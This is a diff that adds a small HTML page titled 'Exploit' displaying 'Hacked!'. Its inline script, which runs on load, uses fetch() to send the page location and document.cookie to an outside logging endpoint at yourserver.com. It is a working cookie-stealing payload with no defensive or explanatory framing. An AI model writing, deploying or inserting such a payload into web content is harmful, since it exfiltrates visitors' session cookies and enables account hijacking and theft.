@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit</title>
+    <script>
+        fetch('https://yourserver.com/log.php?data=' + encodeURIComponent(document.location + ' | ' + document.cookie));
+    </script>
+</head>
+<body>
+    <h1>Hacked!</h1>
+</body>
+</html>
